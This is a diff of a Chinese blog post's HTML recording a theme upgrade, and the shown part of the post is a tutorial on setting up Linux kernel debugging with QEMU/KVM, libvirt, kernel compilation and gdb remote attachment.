@@ -1,134 +1,54 @@
 <!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next muse use-motion" lang="zh-CN">
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-
-  
-  
-  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css"/>
-
-
-
-
+<link rel="stylesheet" href="/css/main.css">
 
 
 
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
 
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sunichi.github.io","root":"/","scheme":"Muse","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
 
-  <meta name="google-site-verification" content="JaodW7D6jSkocuG_zIdKbBnDjM2skzLPZwv5CJMuXiM"/>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
-
-<link rel="stylesheet" href="/css/main.css?v=7.0.1"/>
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/avatar/avatar.jpeg?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/avatar/avatar.jpeg?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/avatar/avatar.jpeg?v=7.0.1">
-
-
-  <link rel="mask-icon" href="/avatar/avatar.jpeg?v=7.0.1" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    version: '7.0.1',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-  
-
-
-
-
-  <meta name="description" content="之前师兄给我看过一个双Ubuntu on VMware Workstation的Linux Kernel调试解决方案，但是在Mac下配起来比Win上困难好多，因此就使用CentOS on VMware Fusion + QEMU/KVM的方案来搭建Linux Kernel（用目标内核替换发行版Linux的内核）调试环境。后来又改进成直接在VM中使用QEMU直接启动Linux Kernel来调试。">
-<meta name="keywords" content="linux,kernel,pwn,debug">
+  <meta name="description" content="之前师兄给我看过一个双Ubuntu on VMware Workstation的Linux Kernel调试解决方案，但是在Mac下配起来比Win上困难好多，因此就使用CentOS on VMware Fusion + QEMU&#x2F;KVM的方案来搭建Linux Kernel（用目标内核替换发行版Linux的内核）调试环境。后来又改进成直接在VM中使用QEMU直接启动Linux Kernel来调试。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Debug Linux Kernel With QEMU&#x2F;KVM">
 <meta property="og:url" content="https://sunichi.github.io/2019/02/13/Debug-Linux-Kernel-With-QEMU-KVM/index.html">
 <meta property="og:site_name" content="Sunichi&#39;s Blog">
-<meta property="og:description" content="之前师兄给我看过一个双Ubuntu on VMware Workstation的Linux Kernel调试解决方案，但是在Mac下配起来比Win上困难好多，因此就使用CentOS on VMware Fusion + QEMU/KVM的方案来搭建Linux Kernel（用目标内核替换发行版Linux的内核）调试环境。后来又改进成直接在VM中使用QEMU直接启动Linux Kernel来调试。">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-05-09T02:48:00.000Z">
+<meta property="og:description" content="之前师兄给我看过一个双Ubuntu on VMware Workstation的Linux Kernel调试解决方案，但是在Mac下配起来比Win上困难好多，因此就使用CentOS on VMware Fusion + QEMU&#x2F;KVM的方案来搭建Linux Kernel（用目标内核替换发行版Linux的内核）调试环境。后来又改进成直接在VM中使用QEMU直接启动Linux Kernel来调试。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-02-13T08:25:00.000Z">
+<meta property="article:modified_time" content="2020-05-09T02:48:00.000Z">
+<meta property="article:author" content="sunichi">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="debug">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Debug Linux Kernel With QEMU&#x2F;KVM">
-<meta name="twitter:description" content="之前师兄给我看过一个双Ubuntu on VMware Workstation的Linux Kernel调试解决方案，但是在Mac下配起来比Win上困难好多，因此就使用CentOS on VMware Fusion + QEMU/KVM的方案来搭建Linux Kernel（用目标内核替换发行版Linux的内核）调试环境。后来又改进成直接在VM中使用QEMU直接启动Linux Kernel来调试。">
 
 
+<link rel="canonical" href="https://sunichi.github.io/2019/02/13/Debug-Linux-Kernel-With-QEMU-KVM/">
 
 
-
-
-  <link rel="canonical" href="https://sunichi.github.io/2019/02/13/Debug-Linux-Kernel-With-QEMU-KVM/"/>
-
-
-
-<script id="page.configurations">
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
   };
 </script>
 
@@ -140,1252 +60,427 @@
 
 
 
-
-
-
-
-
-
   <noscript>
   <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
+  body { margin-top: 2rem; }
+
   .use-motion .menu-item,
-  .sidebar-inner,
+  .use-motion .sidebar,
   .use-motion .post-block,
   .use-motion .pagination,
   .use-motion .comments,
   .use-motion .post-header,
   .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
+  .use-motion .collection-header {
+    visibility: visible;
+  }
 
-  .use-motion .logo,
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
   .use-motion .site-title,
-  .use-motion .site-subtitle {
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
     opacity: initial;
     top: initial;
   }
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
   </style>
 </noscript>
 
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
 
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Sunichi's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-      
-        <h1 class="site-subtitle" itemprop="description">sunichi@DUBHE | Linux & Pwn & Fuzz</h1>
-      
-    
-    
-  </div>
-
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
+    <div class="toggle" aria-label="切换导航栏">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Sunichi's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">sunichi@DUBHE | Linux & Pwn & Fuzz</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
   </div>
 </div>
 
 
 
-<nav class="site-nav">
+
+
+
+
+</div>
+        
   
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
 
-    
-    
-    
-      
-    
+  <aside class="sidebar">
 
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>归档</a>
-
-  </li>
-
-      
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
-            
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br/>搜索</a>
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
         </li>
-      
-    </ul>
-  
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
 
-  
-    
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95Linux-Kernel"><span class="nav-number">1.</span> <span class="nav-text">使用虚拟机源码调试Linux Kernel</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE"><span class="nav-number">1.1.</span> <span class="nav-text">虚拟机配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#QEMU-KVM%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">1.2.</span> <span class="nav-text">QEMU&#x2F;KVM环境配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8%E8%A2%AB%E8%B0%83%E8%AF%95%E6%9C%BA%E4%B8%AD%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8%E5%85%B6%E4%BB%96%E7%89%88%E6%9C%ACLinux%E5%86%85%E6%A0%B8"><span class="nav-number">1.3.</span> <span class="nav-text">在被调试机中编译和使用其他版本Linux内核</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B0%83%E8%AF%95Linux%E5%86%85%E6%A0%B8"><span class="nav-number">1.4.</span> <span class="nav-text">调试Linux内核</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8QEMU%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95Linux-Kernel"><span class="nav-number">2.</span> <span class="nav-text">使用QEMU源码调试Linux Kernel</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E8%AF%91Linux%E5%86%85%E6%A0%B8"><span class="nav-number">2.1.</span> <span class="nav-text">编译Linux内核</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E8%AF%91busybox"><span class="nav-number">2.2.</span> <span class="nav-text">编译busybox</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="nav-number">2.3.</span> <span class="nav-text">生成文件系统</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#QEMU%E5%90%AF%E5%8A%A8Linux-Kernel"><span class="nav-number">2.4.</span> <span class="nav-text">QEMU启动Linux Kernel</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8deboostrap%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="nav-number">2.5.</span> <span class="nav-text">使用deboostrap创建文件系统</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GDB-Patch"><span class="nav-number">2.6.</span> <span class="nav-text">GDB Patch</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E8%AF%91%E7%89%B9%E5%AE%9A%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC%E7%9A%84%E9%A9%B1%E5%8A%A8"><span class="nav-number">2.7.</span> <span class="nav-text">编译特定内核版本的驱动</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%86%85%E6%A0%B8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95"><span class="nav-number">3.</span> <span class="nav-text">基本内核栈溢出漏洞调试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E6%A0%88%E6%BA%A2%E5%87%BA%E7%A4%BA%E4%BE%8B"><span class="nav-number">3.1.</span> <span class="nav-text">简单内核栈溢出示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gadget%E6%90%9C%E7%B4%A2"><span class="nav-number">3.2.</span> <span class="nav-text">gadget搜索</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ubuntu-64%E4%BD%8D%E4%B8%8B%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F"><span class="nav-number">4.</span> <span class="nav-text">Ubuntu 64位下编译32位程序</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E6%A0%B8"><span class="nav-number">4.1.</span> <span class="nav-text">内核</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Busybox"><span class="nav-number">4.2.</span> <span class="nav-text">Busybox</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A9%B1%E5%8A%A8"><span class="nav-number">4.3.</span> <span class="nav-text">驱动</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%E5%92%8C%E8%B5%84%E6%96%99"><span class="nav-number">5.</span> <span class="nav-text">参考文章和资料</span></a></li></ol></div>
+      </section>
+      <!--/noindex-->
 
-  
-
-  
-    <div class="site-search">
-      
-  <div class="popup search-popup local-search-popup">
-  <div class="local-search-header clearfix">
-    <span class="search-icon">
-      <i class="fa fa-search"></i>
-    </span>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-    <div class="local-search-input-wrapper">
-      <input autocomplete="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
-    </div>
-  </div>
-  <div id="local-search-result"></div>
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">sunichi</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">54</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
 </div>
 
 
 
+      </section>
     </div>
-  
-</nav>
+  </aside>
+  <div class="sidebar-dimmer"></div>
 
 
-
-  
-
-
-
-</div>
     </header>
 
     
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
 
 
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-          <div id="content" class="content">
-            
+    <div class="main-inner post posts-expand">
+      
 
-  <div id="posts" class="posts-expand">
+      
+
     
-
-  
-
   
   
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://sunichi.github.io/2019/02/13/Debug-Linux-Kernel-With-QEMU-KVM/"/>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sunichi.github.io/2019/02/13/Debug-Linux-Kernel-With-QEMU-KVM/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sunichi"/>
-      <meta itemprop="description" content=""/>
-      <meta itemprop="image" content="/avatar/avatar.jpeg"/>
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="sunichi">
+      <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sunichi's Blog"/>
+      <meta itemprop="name" content="Sunichi's Blog">
     </span>
 
     
+    
       <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Debug Linux Kernel With QEMU/KVM
+        </h1>
 
-        
-        
-          <h2 class="post-title" itemprop="name headline">Debug Linux Kernel With QEMU/KVM
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
 
-              
-            
-          </h2>
-        
+      <time title="创建时间：2019-02-13 16:25:00" itemprop="dateCreated datePublished" datetime="2019-02-13T16:25:00+08:00">2019-02-13</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-05-09 10:48:00" itemprop="dateModified" datetime="2020-05-09T10:48:00+08:00">2020-05-09</time>
+      </span>
 
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-02-13 16:25:00" itemprop="dateCreated datePublished" datetime="2019-02-13T16:25:00+08:00">2019-02-13</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2020-05-09 10:48:00" itemprop="dateModified" datetime="2020-05-09T10:48:00+08:00">2020-05-09</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
+  
+</div>
 
         </div>
       </header>
-    
 
     
     
     
     <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
         <p>之前师兄给我看过一个双Ubuntu on VMware Workstation的Linux Kernel调试解决方案，但是在Mac下配起来比Win上困难好多，因此就使用CentOS on VMware Fusion + QEMU/KVM的方案来搭建Linux Kernel（用目标内核替换发行版Linux的内核）调试环境。后来又改进成直接在VM中使用QEMU直接启动Linux Kernel来调试。</p>
 <a id="more"></a>
+
 <h3 id="使用虚拟机源码调试Linux-Kernel"><a href="#使用虚拟机源码调试Linux-Kernel" class="headerlink" title="使用虚拟机源码调试Linux Kernel"></a>使用虚拟机源码调试Linux Kernel</h3><p>实验环境：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">宿主：macOS Mojave + VMware Fusion 11 Pro</span><br><span class="line">虚拟机：CentOS 7.6.1810 64 bit</span><br><span class="line">被调试机：CentOS 6.10 64 bit</span><br></pre></td></tr></table></figure>
+
 <h4 id="虚拟机配置"><a href="#虚拟机配置" class="headerlink" title="虚拟机配置"></a>虚拟机配置</h4><p>建议分配50G以上的硬盘空间。在设置中需要打开<code>在此虚拟机中启用虚拟化管理程序</code>选项以让虚拟机提供Intel VT-x/EPT支持。使用CentOS的Live版本的iso进行安装，选择”Test Then Start”的选项启动系统避免发生错误。</p>
 <p>能够正常打开系统后，选择安装到硬盘即可。</p>
 <h4 id="QEMU-KVM环境配置"><a href="#QEMU-KVM环境配置" class="headerlink" title="QEMU/KVM环境配置"></a>QEMU/KVM环境配置</h4><p>在虚拟机中安装QEMU/KVM和VIRT环境：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install qemu-kvm qemu-system virt-manager libvirt libvirt-python libvirt-client virt-install virt-viewer</span><br></pre></td></tr></table></figure>
+
 <p>启动<code>libvirtd</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service libvirtd start</span><br></pre></td></tr></table></figure>
+
 <p>在启动<code>virt-manager</code>时，如果遇到权限问题，则修改/etc/libvirt/qemu.conf，添加下述内容并重启服务。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user = <span class="string">"root"</span> </span><br><span class="line">group = <span class="string">"root"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user = <span class="string">&quot;root&quot;</span> </span><br><span class="line">group = <span class="string">&quot;root&quot;</span> </span><br></pre></td></tr></table></figure>
+
 <p>下载所要调试的内核的载体操作系统，并将iso文件放到libvirt的images目录下。通过<code>virt-manager</code>创建KVM，硬盘空间建议设置为25G以上。在进行到最后一步时勾选启动前进行配置。在设置面板的<code>CPU</code>选项中，将复制CPU参数选中然后再开始进行安装。</p>
 <p>经上述步骤后，KVM启动，使用</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">virsh list</span><br><span class="line">virsh edit</span><br></pre></td></tr></table></figure>
+
 <p>来修改配置，将第一行改为</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;domain <span class="built_in">type</span>=<span class="string">'kvm'</span> xmlns:qemu=<span class="string">'http://libvirt.org/schemas/domain/qemu/1.0'</span>&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;domain <span class="built_in">type</span>=<span class="string">&#x27;kvm&#x27;</span> xmlns:qemu=<span class="string">&#x27;http://libvirt.org/schemas/domain/qemu/1.0&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
+
 <p>在<code>&lt;/device&gt;</code>后加入</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;qemu:commandline&gt;</span><br><span class="line">   &lt;qemu:arg value=<span class="string">'-S'</span>/&gt;</span><br><span class="line">   &lt;qemu:arg value=<span class="string">'-gdb'</span>/&gt;</span><br><span class="line">   &lt;qemu:arg value=<span class="string">'tcp::1234'</span>/&gt;</span><br><span class="line"> &lt;/qemu:commandline&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;qemu:commandline&gt;</span><br><span class="line">   &lt;qemu:arg value=<span class="string">&#x27;-S&#x27;</span>/&gt;</span><br><span class="line">   &lt;qemu:arg value=<span class="string">&#x27;-gdb&#x27;</span>/&gt;</span><br><span class="line">   &lt;qemu:arg value=<span class="string">&#x27;tcp::1234&#x27;</span>/&gt;</span><br><span class="line"> &lt;/qemu:commandline&gt;</span><br></pre></td></tr></table></figure>
+
 <p>当KVM被重启后，将会在<code>localhost</code>开启1234端口进行gdb的监听。</p>
 <h4 id="在被调试机中编译和使用其他版本Linux内核"><a href="#在被调试机中编译和使用其他版本Linux内核" class="headerlink" title="在被调试机中编译和使用其他版本Linux内核"></a>在被调试机中编译和使用其他版本Linux内核</h4><p>在QEMU/KVM中安装</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc ncurses-devel</span><br></pre></td></tr></table></figure>
+
 <p>从kernel.org上下载3.18.35源码，修改Makefile文件的617行的KBUILD_CFLAGS值为O1，进行编译</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">make</span><br><span class="line">make modules_install</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
 <p>在<code>make install</code>后，会报一些<code>could not find module</code>的错误，忽略之。查看当前已有的内核版本</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /boot/grub/grub.conf | awk <span class="string">'$1=="title" &#123;print i++ " :" $NF&#125;'</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /boot/grub/grub.conf | awk <span class="string">&#x27;$1==&quot;title&quot; &#123;print i++ &quot; :&quot; $NF&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
 <p>修改当前默认启动的内核版本后，重启即可。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /boot/grub/grub.conf</span><br><span class="line">default = 0</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
+
 <h4 id="调试Linux内核"><a href="#调试Linux内核" class="headerlink" title="调试Linux内核"></a>调试Linux内核</h4><p>由于之前已经设置好了参数，在被调试机启动后将会开启1234端口作为gdb的调试端口，将编译好的<code>vmlinux</code>保存到虚拟机中，启动gdb进行调试。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scp root@kvm_ip:/path/to/vmlinux ./</span><br><span class="line">gdb vmlinux</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>
+
 <h3 id="使用QEMU源码调试Linux-Kernel"><a href="#使用QEMU源码调试Linux-Kernel" class="headerlink" title="使用QEMU源码调试Linux Kernel"></a>使用QEMU源码调试Linux Kernel</h3><p>实验环境：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">宿主：macOS Mojave + VMware Fusion 11 Pro + Ubuntu 16.04.6 </span><br><span class="line">被调试机：Linux Kernel 2.6.32.29</span><br></pre></td></tr></table></figure>
+
 <h4 id="编译Linux内核"><a href="#编译Linux内核" class="headerlink" title="编译Linux内核"></a>编译Linux内核</h4><p>由于所需要编译的Linux版本较低，因此需要将gcc切换成gcc 4.8后再编译。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-x x</span><br><span class="line">sudo update-alternatives --config gcc</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
